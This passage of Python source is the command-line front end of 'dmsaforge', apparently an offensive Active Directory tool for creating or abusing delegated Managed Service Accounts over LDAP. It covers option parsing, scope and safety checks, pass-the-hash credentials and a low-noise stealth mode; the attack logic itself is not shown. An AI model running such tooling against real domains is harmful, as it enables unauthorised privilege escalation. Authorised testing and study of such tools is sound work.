        workflow.add_argument('--yes', action='store_true', help='Confirm destructive action.')
    if action in ASSESS_ACTIONS:
        search = workflow
        search.add_argument('--ou', '--target-ou', '-o', dest='target_ou', action='store', metavar='OU_DN', help='Optional OU DN used as the assessment base.')
        search.add_argument('--summary', dest='search_summary', action='store_true', help='Run lightweight OU-only mode without security descriptor analysis.')
        search.add_argument('--include-security-descriptor', dest='include_sd', action='store_true', help='Request and analyze OU nTSecurityDescriptor security descriptors. This is the default unless --summary is used.')
        search.add_argument('--resolve-names', action='store_true', help='Resolve matching SIDs to account names. Requires --include-security-descriptor.')
        search.add_argument('--skip-dc-prereq', action='store_true', help='Skip the Windows Server 2025 prerequisite DC query.')
    return workflow


def order_action_help_groups(parser):
    parser._optionals.title = 'options'
    desired = ('positional arguments', 'main', 'LDAP', 'options')
    ordered = []
    for title in desired:
        for group in parser._action_groups:
            if group.title == title and group not in ordered:
                ordered.append(group)
    for group in parser._action_groups:
        if group not in ordered:
            ordered.append(group)
    parser._action_groups = ordered


def configure_action_parser(parser, action):
    parser.set_defaults(action=action, command=action, action_first=True)
    parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
    main_group = add_dmsa_workflow_options(parser, action, concise=True, title='main')
    add_common_local_options(parser, concise=True, workflow_group=main_group)
    add_connection_options(parser, show_auth=False, concise=True)
    add_common_advanced_options(parser, visible=False)
    order_action_help_groups(parser)
    return parser


def build_action_help_parser(action):
    parser = argparse.ArgumentParser(
        prog='%s %s' % (TOOL_NAME, action),
        usage=ACTION_USAGE[action],
        description=None,
        epilog='More information: %s    Email: 888256@gmail.com' % PROJECT_URL,
        formatter_class=WideHelpFormatter,
    )
    configure_action_parser(parser, action)
    return parser


def build_subcommand_parser():
    parser = argparse.ArgumentParser(
        prog=TOOL_NAME,
        formatter_class=WideHelpFormatter,
    )
    parser.add_argument('-v', '--version', action='version', version='%s %s' % (TOOL_NAME, TOOL_VERSION))
    parser.add_argument('--completion-script', choices=('bash', 'zsh'), help=argparse.SUPPRESS)
    subparsers = parser.add_subparsers(dest='command', metavar='action')

    for action in VISIBLE_ACTION_CHOICES:
        subparser = subparsers.add_parser(
            action,
            help=ACTION_SUMMARY[action],
            usage=ACTION_USAGE[action],
            description=ACTION_HELP.get(action, ACTION_SUMMARY[action]),
            formatter_class=WideHelpFormatter,
        )
        configure_action_parser(subparser, action)

    plan_parser = subparsers.add_parser(
        'plan',
        help='Dry-run shorthand for an action.',
        description='Use "dmsaforge plan ACTION ..." as shorthand for "dmsaforge ACTION ... --dry-run".',
        formatter_class=WideHelpFormatter,
    )
    plan_parser.set_defaults(action='plan', command='plan', action_first=True)
    plan_parser.add_argument('plan_args', nargs=argparse.REMAINDER, help='Action and action arguments.')

    update_parser = subparsers.add_parser(
        'update',
        help='Update dmsaforge in the current Python environment.',
        description=UPDATE_HELP,
        epilog='More information: %s    Email: 888256@gmail.com' % PROJECT_URL,
        formatter_class=WideHelpFormatter,
    )
    update_parser.set_defaults(action='update', command='update', action_first=True)
    add_update_options(update_parser)
    return parser


def normalize_plan_shortcut(argv):
    if not argv or argv[0] != 'plan':
        return list(argv)
    if len(argv) == 1 or argv[1] in ('-h', '--help'):
        print_plan_help()
        return None
    action = argv[1]
    if action not in ACTION_CHOICES:
        raise ValueError('Unknown plan action "%s". Known actions: %s' % (action, ', '.join(ACTION_CHOICES)))
    tail = list(argv[2:])
    if any(arg in ('-h', '--help') for arg in tail):
        print_action_help(action, no_banner='--no-banner' in tail)
        return None
    non_display_args = [arg for arg in tail if arg != '--no-banner']
    if not non_display_args:
        print_action_help(action, no_banner='--no-banner' in tail)
        return None
    planned = [action] + tail
    if not option_supplied(planned, OPTION_ALIASES['dry_run']):
        planned.append('--dry-run')
    return planned


def action_help_requested(argv):
    if not argv or argv[0] not in VISIBLE_ACTION_CHOICES:
        return False
    tail = list(argv[1:])
    if any(arg in ('-h', '--help') for arg in tail):
        return True
    non_display_args = [arg for arg in tail if arg != '--no-banner']
    return len(non_display_args) == 0


def validate_action_requirements(parser, options):
    missing = [
        flag for attr, flag in ACTION_REQUIREMENTS.get(options.action, ())
        if not getattr(options, attr)
    ]
    if missing:
        parser.error('Action "%s" requires: %s' % (options.action, ', '.join(missing)))


def prepare_cli_options(parser, options):
    if options.next_step_prefix:
        options.next_step_prefix = normalize_command_prefix(options.next_step_prefix)
    else:
        options.next_step_prefix = infer_next_step_prefix()

    if options.dmsa_name:
        normalized = normalized_dmsa_name(options.dmsa_name)
        if normalized:
            options.dmsa_name = normalized

    account_domain = domain_from_account_hint(options.account)
    if account_domain and validate_domain_name(account_domain):
        account_domain = account_domain.lower()
        if options.scope_domain is None:
            options.scope_domain = account_domain
        if options.base_dn is None:
            options.base_dn = domain_to_base_dn(account_domain)
    elif options.target_ou and validate_dn_syntax(options.target_ou):
        target_ou_base_dn = base_dn_from_dn_context(options.target_ou)
        target_ou_domain = domain_from_base_dn(target_ou_base_dn)
        if target_ou_domain and validate_domain_name(target_ou_domain):
            if options.scope_domain is None:
                options.scope_domain = target_ou_domain.lower()
            if options.base_dn is None:
                options.base_dn = target_ou_base_dn

    if getattr(options, 'port_supplied', False) and not getattr(options, 'method_supplied', False):
        options.method = 'LDAPS' if options.port == 636 else 'LDAP'

    if options.base_dn is None and options.scope_base_dn and validate_dn_syntax(options.scope_base_dn):
        options.base_dn = options.scope_base_dn

    if getattr(options, 'output_only', False):
        options.quiet = True
        options.no_banner = True
        if not options.json and not options.output:
            options.json = True

    if options.low_noise:
        options.minimal = True
        options.quiet = True
        options.no_banner = True
        if options.action in ASSESS_ACTIONS:
            options.skip_dc_prereq = True

    if options.minimal:
        incompatible = []
        if options.include_sd:
            incompatible.append('--include-security-descriptor')
        if options.resolve_names:
            incompatible.append('--resolve-names')
        if options.kerberos_guidance:
            incompatible.append('--kerberos-guidance')
        if incompatible:
            parser.error('--minimal cannot be combined with %s' % ', '.join(incompatible))
        if options.action in ASSESS_ACTIONS:
            options.skip_dc_prereq = True
        options.search_summary = True

    if options.action in ASSESS_ACTIONS and not options.search_summary and not options.minimal:
        options.include_sd = True

    if options.scope_domain:
        options.scope_domain = options.scope_domain.strip().lower()
        if not validate_domain_name(options.scope_domain):
            parser.error('--scope-domain must be a DNS domain such as redteamnotes.com')

        scope_domain_dn = domain_to_base_dn(options.scope_domain)
        if options.scope_base_dn is None:
            options.scope_base_dn = scope_domain_dn
        elif not validate_dn_syntax(options.scope_base_dn):
            parser.error('--scope-base-dn is not a valid distinguished name')
        elif not dn_in_scope(options.scope_base_dn, scope_domain_dn):
            parser.error('--scope-base-dn must be equal to or inside --scope-domain')

        if options.base_dn is None:
            options.base_dn = scope_domain_dn

        if account_domain and '.' in account_domain and account_domain.lower() != options.scope_domain:
            parser.error('account domain is outside --scope-domain')


def validate_reporting_options(parser, options):
    if options.output_only and not (options.json or options.output):
        parser.error('--output-only requires --json or --output.')

    if not options.redact and not options.debug:
        parser.error('--no-redact requires --debug')

    if options.verify_attempts < 1:
        parser.error('--verify-attempts must be 1 or greater')


def validate_cli_options(parser, options):
    validate_action_requirements(parser, options)
    validate_reporting_options(parser, options)

    if options.skip_dc_prereq and options.action not in ASSESS_ACTIONS:
        parser.error('--skip-dc-prereq is only supported for assess.')

    if options.action in DESTRUCTIVE_ACTIONS and not options.yes and not options.dry_run:
        parser.error('Action "%s" requires --yes. Use --dry-run to preview without confirmation.' % options.action)

    if options.action == 'add' and not options.dry_run:
        missing_add_inputs = []
        if not options.target_account:
            missing_add_inputs.append('--target-account')
        if not options.principals_allowed:
            missing_add_inputs.append('--principals-allowed')
        if missing_add_inputs:
            parser.error(
                'Action "add" execution requires: %s. Use "dmsaforge plan add ..." to preview values before writing LDAP.'
                % ', '.join(missing_add_inputs)
            )

    if options.search_summary and options.include_sd:
        parser.error('--summary cannot be combined with --include-security-descriptor')

    if options.resolve_names and not options.include_sd:
        parser.error('--resolve-names requires --include-security-descriptor')

    if options.hashes is not None and options.hashes.count(':') != 1:
        parser.error('--hashes must use LMHASH:NTHASH format')

    if options.dmsa_name and not validate_dmsa_name(options.dmsa_name):
        parser.error('--dmsa-name must be a DNS-safe label: letters, digits, and hyphens only; trailing "$" is normalized automatically.')

    if options.dns_hostname and not validate_dns_hostname(options.dns_hostname):
        parser.error('--dns-hostname must be a DNS hostname such as redpen.redteamnotes.com')

    for attr, flag in (
        ('base_dn', '--base-dn'),
        ('scope_base_dn', '--scope-base-dn'),
        ('target_ou', '--ou'),
    ):
        value = getattr(options, attr)
        if value and not validate_dn_syntax(value):
            parser.error('%s is not a valid distinguished name' % flag)

    if options.target_account and looks_like_dn(options.target_account) and not validate_dn_syntax(options.target_account):
        parser.error('--target-account DN is not a valid distinguished name')

    if options.principals_allowed and str(options.principals_allowed).upper().startswith('S-') and not validate_sid_syntax(options.principals_allowed):
        parser.error('--principals-allowed SID is not valid')

    if options.principals_allowed and looks_like_dn(options.principals_allowed) and not validate_dn_syntax(options.principals_allowed):
        parser.error('--principals-allowed DN is not a valid distinguished name')

    incompatible_ports = {
        ('LDAP', 636): '--method LDAP uses port 389; omit --port or set --port 389',
        ('LDAPS', 389): '--method LDAPS uses port 636; omit --port or set --port 636',
    }
    message = incompatible_ports.get((options.method, options.port))
    if message:
        parser.error(message)

    if options.scope_base_dn:
        if options.base_dn and not dn_in_scope(options.base_dn, options.scope_base_dn):
            parser.error('--base-dn must be equal to or inside --scope-base-dn')
        if options.target_ou and not dn_in_scope(options.target_ou, options.scope_base_dn):
            parser.error('--ou is outside --scope-base-dn')
        if options.target_account and looks_like_dn(options.target_account) and not dn_in_scope(options.target_account, options.scope_base_dn):
            parser.error('--target-account DN is outside --scope-base-dn')
        if options.principals_allowed and looks_like_dn(options.principals_allowed) and not dn_in_scope(options.principals_allowed, options.scope_base_dn):
            parser.error('--principals-allowed DN is outside --scope-base-dn')


def configure_logging(options):
    if options.output_only and not options.debug:
        logging.basicConfig(level=logging.CRITICAL, format='%(levelname)s: %(message)s', stream=sys.stderr)
        return

    if options.json:
        level = logging.DEBUG if options.debug else (logging.WARNING if options.quiet else logging.INFO)
        fmt = '%(asctime)s %(levelname)s: %(message)s' if options.ts else '%(levelname)s: %(message)s'
        logging.basicConfig(level=level, format=fmt, stream=sys.stderr)
        return

    if logger is not None:
        logger.init(options.ts, options.debug)
        logging.getLogger().setLevel(logging.DEBUG if options.debug else (logging.WARNING if options.quiet else logging.INFO))
        install_terminal_log_colors(options)
        return

    level = logging.DEBUG if options.debug else (logging.WARNING if options.quiet else logging.INFO)
    fmt = '%(asctime)s %(levelname)s: %(message)s' if options.ts else '%(levelname)s: %(message)s'
    logging.basicConfig(level=level, format=fmt, stream=sys.stderr)
    install_terminal_log_colors(options)


def install_terminal_log_colors(options):
    if not should_colorize_logs(options):
        return
    for handler in logging.getLogger().handlers:
        stream = getattr(handler, 'stream', sys.stderr)
        if not getattr(stream, 'isatty', lambda: False)():
            continue
        if isinstance(handler.formatter, TerminalColorFormatter):
            continue
        handler.setFormatter(TerminalColorFormatter(handler.formatter))


def should_colorize_logs(options):
    if os.environ.get('NO_COLOR') is not None:
        return False
    if getattr(options, 'json', False) or getattr(options, 'output_only', False):
        return False
    if getattr(options, 'quiet', False):
        return False
    return bool(getattr(sys.stderr, 'isatty', lambda: False)())


def missing_runtime_dependencies():
    missing_deps = []
    if _IMPACKET_IMPORT_ERROR is not None:
        missing_deps.append('impacket (%s)' % _IMPACKET_IMPORT_ERROR)
    if _PYASN1_IMPORT_ERROR is not None:
        missing_deps.append('pyasn1 (%s)' % _PYASN1_IMPORT_ERROR)
    return missing_deps


def parse_account(options):
    if '@' in options.account and options.dc_host is None:
        domain, username, password, remote_host = parse_target(options.account)
        options.dc_host = remote_host

        if password == '' and username != '' and options.hashes is None and not options.no_pass and options.aes_key is None:
            from getpass import getpass
            password = getpass('Password:')

        lmhash = ''
        nthash = ''
        if options.hashes is not None:
            lmhash, nthash = options.hashes.split(':')
            if lmhash == '':
                lmhash = 'AAD3B435B51404EEAAD3B435B51404EE'

        if options.aes_key is not None:
            options.k = True
        return domain, username, password, lmhash, nthash

    domain, username, password, lmhash, nthash, options.k = parse_identity(
        options.account,
        options.hashes,
        options.no_pass,
        options.aes_key,
        options.k,
    )
    return domain, username, password, lmhash, nthash


def run_update(options):
    return run_update_workflow(
        options,
        current_version=TOOL_VERSION,
        package_version=__version__,
        tool_name=TOOL_NAME,
        default_source=DEFAULT_UPDATE_SOURCE,
        version_url=DEFAULT_UPDATE_VERSION_URL,
        should_show_banner=should_show_banner,
        print_banner=print_startup_banner,
        runner=subprocess.run,
    )


def run_completion_script(shell):
    sys.stdout.write(completion_script(shell))
    return 0


def _main(argv=None):
    if argv is None:
        argv = sys.argv[1:]

    if len(argv) == 2 and argv[0] == '--completion-script':
        if argv[1] not in ('bash', 'zsh'):
            sys.stderr.write('usage: dmsaforge --completion-script {bash,zsh}\n')
            return 2
        return run_completion_script(argv[1])

    if len(argv) == 0:
        parser = build_subcommand_parser()
        print_parser_help_with_hint(parser)
        return 0

    if len(argv) == 1 and argv[0] in ('-h', '--help'):
        parser = build_subcommand_parser()
        print_parser_help_with_hint(parser)
        return 0

    if len(argv) == 1 and argv[0] in ('-v', '--version'):
        parser = build_subcommand_parser()
        parser.parse_args(argv)
        return 0

    if len(argv) == 1 and argv[0] == '--no-banner':
        parser = build_subcommand_parser()
        print_parser_help_with_hint(parser, no_banner=True)
        return 0

    if len(argv) == 2 and argv[0] == '--no-banner' and argv[1] in ('-h', '--help'):
        parser = build_subcommand_parser()
        print_parser_help_with_hint(parser, no_banner=True)
        return 0

    if len(argv) == 2 and argv[0] == 'update' and argv[1] in ('-h', '--help'):
        print_update_help()
        return 0

    single_dash_long = find_single_dash_long_option(argv)
    if single_dash_long:
        parser = build_subcommand_parser()
        parser.error('unrecognized arguments: %s' % single_dash_long)

    if action_help_requested(argv):
        print_action_help(argv[0], no_banner='--no-banner' in argv[1:])
        return 0

    if argv[0] == 'plan':
        try:
            normalized_plan = normalize_plan_shortcut(argv)
        except ValueError as e:
            parser = build_subcommand_parser()
            parser.error(str(e))
        if normalized_plan is None:
            return 0
        argv = normalized_plan

    if argv[0] in SUBCOMMAND_CHOICES:
        parser = build_subcommand_parser()
        parse_argv = list(argv)
    else:
        parser = build_subcommand_parser()
        parser.error('unrecognized action: %s' % argv[0])

    options = parser.parse_args(parse_argv)
    apply_option_defaults(options)
    mark_supplied_options(options, parse_argv)

    options.operation_id = uuid.uuid4().hex
    if options.action == 'update':
        configure_logging(options)
        return run_update(options)

    apply_profile(parser, options, parse_argv)
    prepare_cli_options(parser, options)
    validate_cli_options(parser, options)
    configure_logging(options)

    if options.dry_run:
        if should_show_banner(options):
            print_startup_banner()
        report = build_operation_report(options, mode='dry_run', success=True)
        attach_next_steps(report, options, mode='dry_run', success=True)
        if options.json:
            if not emit_report(options, report):
                return 1
        else:
            print_dry_run_plan(options, report=report)
            print_next_steps(options, report)
            if not emit_report(options, report):
                return 1
        return 0

    missing_deps = missing_runtime_dependencies()
    if missing_deps:
        logging.critical('Missing runtime dependencies: %s' % '; '.join(missing_deps))
        logging.critical('Install Impacket and pyasn1 in the Python environment used to run this tool.')
        report = build_operation_report(
            options,
            mode='execute',
            success=False,
            result={'error': 'missing runtime dependencies', 'details': missing_deps},
        )
        attach_next_steps(report, options, mode='execute', success=False)
        print_next_steps(options, report)
        if not emit_report(options, report):
            return 1
        return 1

    if should_show_banner(options):
        print_startup_banner()
    domain, username, password, lmhash, nthash = parse_account(options)

    if domain == '':
        logging.critical('Domain should be specified!')
        report = build_operation_report(
            options,
            mode='execute',
            success=False,
            result={'error': 'domain should be specified'},
        )
        attach_next_steps(report, options, mode='execute', success=False)
        print_next_steps(options, report)
        if not emit_report(options, report):
            return 1
        return 1

    try:
        executor = DMSAForge(username, password, domain, lmhash, nthash, options)
        success = executor.run()
        options.dmsa_name = executor._dmsa_name or options.dmsa_name
        options.method = executor._method
        options.port = executor._port
        options.base_dn = executor._base_dn or options.base_dn
        options.scope_base_dn = executor._scope_base_dn or options.scope_base_dn
        options.scope_domain = executor._scope_domain or options.scope_domain
        attach_next_steps(executor.report, options, mode='execute', success=success)
        print_next_steps(options, executor.report)
        if not emit_report(options, executor.report):
            return 1
        return 0 if success else 1
    except Exception as e:
        if getattr(options, 'debug', False):
            logging.exception('Unhandled error')
        else:
            logging.critical(str(e))
        report = build_operation_report(
            options,
            mode='execute',
            success=False,
            result={'error': str(e)},
        )
        attach_next_steps(report, options, mode='execute', success=False)
        print_next_steps(options, report)
        if not emit_report(options, report):
            return 1
        return 1


def main(argv=None):
    start_cwd = os.getcwd()
    try:
        return _main(argv)
    finally:
        try:
            os.chdir(start_cwd)
        except OSError:
            pass


if __name__ == '__main__':
    sys.exit(main())
